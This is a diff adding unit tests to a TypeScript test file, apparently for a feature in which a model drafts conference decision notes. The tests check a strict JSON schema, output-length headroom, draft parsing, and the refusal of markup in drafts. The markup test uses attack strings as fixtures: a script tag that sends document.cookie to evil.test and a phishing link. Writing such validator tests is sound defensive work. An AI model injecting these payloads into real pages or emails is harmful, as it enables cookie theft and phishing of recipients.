@@ -8,6 +8,7 @@ import {
 } from "./client";
 import {
   buildDecisionNoteProjection,
+  containsMarkup,
   DECISION_NOTE_DATA_CLOSE,
   DECISION_NOTE_DATA_OPEN,
   DECISION_NOTE_INSTRUCTIONS,
@@ -17,10 +18,13 @@ import {
   DECISION_NOTE_MAX_TOTAL_COMMENT_CHARS,
   DECISION_NOTE_NOT_DECIDED_CODE,
   DECISION_NOTE_NOT_FOUND_CODE,
+  DECISION_NOTE_REQUEST_MAX_OUTPUT_CHARS,
+  DECISION_NOTE_TEXT_FORMAT,
   DECISION_NOTE_UNAVAILABLE,
   decisionNoteRequestSchema,
   decisionNoteUnavailable,
   flattenProjectedField,
+  parseDecisionNoteDraft,
   renderDecisionNoteInput,
   resolveDecisionNoteTarget,
   type DecisionNoteAbstract,
@@ -287,6 +291,116 @@ test("flattening kills newlines, control characters, and fake delimiters", () =>
 /* -------------------------------------------------------------------------- */
 /* Unavailable envelope                                                       */
 /* -------------------------------------------------------------------------- */
+
+/* -------------------------------------------------------------------------- */
+/* Structured output                                                          */
+/* -------------------------------------------------------------------------- */
+
+test("the code-owned schema admits exactly one string field and forbids everything else", () => {
+  assert.deepEqual(DECISION_NOTE_TEXT_FORMAT, {
+    type: "json_schema",
+    name: "greenroom_decision_note",
+    strict: true,
+    schema: {
+      type: "object",
+      additionalProperties: false,
+      required: ["draft"],
+      properties: { draft: { type: "string" } },
+    },
+  });
+  // `strict` with `additionalProperties: false` is the whole point: there is no
+  // second field for a model to invent, and none for the route to forward.
+  assert.equal(DECISION_NOTE_TEXT_FORMAT.strict, true);
+  assert.equal(DECISION_NOTE_TEXT_FORMAT.schema.additionalProperties, false);
+});
+
+test("the request leaves room for the JSON envelope the schema forces", () => {
+  // A draft exactly at the cap arrives wrapped, so asking for only the cap
+  // would truncate the closing brace off a valid answer and report it as
+  // malformed — a constant's bug wearing a model's costume.
+  assert.ok(DECISION_NOTE_REQUEST_MAX_OUTPUT_CHARS > DECISION_NOTE_MAX_DRAFT_CHARS);
+  const worst = JSON.stringify({ draft: "x".repeat(DECISION_NOTE_MAX_DRAFT_CHARS) });
+  assert.ok(
+    worst.length <= DECISION_NOTE_REQUEST_MAX_OUTPUT_CHARS,
+    `a maximal draft wraps to ${worst.length} chars, which must fit the ask`,
+  );
+  // Room to spare, since every quote and newline in the text costs extra.
+  assert.ok(DECISION_NOTE_REQUEST_MAX_OUTPUT_CHARS - worst.length >= 300);
+});
+
+test("a well-formed structured answer parses to the trimmed draft", () => {
+  assert.deepEqual(parseDecisionNoteDraft(JSON.stringify({ draft: "  A warm note.  " })), {
+    ok: true,
+    draft: "A warm note.",
+  });
+  // Exactly at the cap is accepted, so the boundary is a boundary.
+  const atCap = "y".repeat(DECISION_NOTE_MAX_DRAFT_CHARS);
+  assert.deepEqual(parseDecisionNoteDraft(JSON.stringify({ draft: atCap })), { ok: true, draft: atCap });
+});
+
+test("malformed, empty, extra-key and overlong answers all collapse to invalid_output", () => {
+  for (const [label, text] of [
+    ["not JSON", "A warm note."],
+    ["a truncated envelope", '{"draft":"A warm note.'],
+    ["an array", JSON.stringify(["A warm note."])],
+    ["a bare string", JSON.stringify("A warm note.")],
+    ["null", JSON.stringify(null)],
+    ["a missing key", JSON.stringify({ note: "A warm note." })],
+    ["a non-string draft", JSON.stringify({ draft: 42 })],
+    ["an empty draft", JSON.stringify({ draft: "" })],
+    ["a whitespace draft", JSON.stringify({ draft: " \n\t " })],
+    ["an extra key", JSON.stringify({ draft: "A warm note.", confidence: 0.9 })],
+    ["one char over the cap", JSON.stringify({ draft: "z".repeat(DECISION_NOTE_MAX_DRAFT_CHARS + 1) })],
+  ] as Array<[string, string]>) {
+    assert.deepEqual(
+      parseDecisionNoteDraft(text),
+      { ok: false, reason: "invalid_output" },
+      `${label} must be refused`,
+    );
+  }
+});
+
+test("markup in a draft is REFUSED, not sanitized — including benign formatting", () => {
+  // The three the audit named. The third is the one that matters: `<strong>` is
+  // not dangerous, but a model returning tags is not returning plain text, and
+  // the draft's destination is the personal note, which the decision email
+  // renders through `sanitizeHtml` — the one path in this product that
+  // deliberately preserves ADMIN-authored formatting. Provider markup arriving
+  // there would have been laundered into "allowed formatting".
+  for (const [label, draft] of [
+    ["a script tag", '<script>fetch("https://evil.test?c="+document.cookie)</script> Congratulations!'],
+    ["a link", 'Congratulations! <a href="https://evil.test">Confirm your talk here</a>'],
+    ["benign bold", "Congratulations — we loved <strong>the structure</strong> of this one."],
+    ["a closing tag alone", "Congratulations!</p>"],
+    ["an escaped tag", "Congratulations! &lt;script&gt;alert(1)&lt;/script&gt;"],
+    ["a numeric escaped bracket", "Congratulations! &#60;b&#62;bold&#60;/b&#62;"],
+    ["a hex escaped bracket", "Congratulations! &#x3C;b&#x3E;bold"],
+    ["a bare tag with no content", "<br>"],
+  ] as Array<[string, string]>) {
+    assert.deepEqual(
+      parseDecisionNoteDraft(JSON.stringify({ draft })),
+      { ok: false, reason: "invalid_output" },
+      `${label} must be refused outright, never cleaned and kept`,
+    );
+    assert.equal(containsMarkup(draft), true, label);
+  }
+});
+
+test("the markup rule does not refuse honest prose that merely contains punctuation", () => {
+  // Non-vacuity in the other direction: an over-broad rule would refuse real
+  // drafts and quietly make the feature useless.
+  for (const [label, draft] of [
+    ["a comparison", "We had fewer than 5 < 10 slots for this track, so competition was fierce."],
+    ["an ampersand", "Your work on AT&T and R&D case studies is exactly what we wanted."],
+    ["an arrow", "The flow you describe — intake -> review -> stage — is the useful part."],
+    ["quotes and dashes", 'We loved the "war story" framing — it is concrete and honest.'],
+    ["a bare angle at the end", "Rated highly on depth <"],
+  ] as Array<[string, string]>) {
+    assert.equal(containsMarkup(draft), false, `${label} must not read as markup`);
+    const parsed = parseDecisionNoteDraft(JSON.stringify({ draft }));
+    assert.equal(parsed.ok, true, `${label} must still be accepted`);
+  }
+});
 
 test("every assistant reason maps to a stable refusal that keeps the manual path open", () => {
   const seen = new Set<string>();
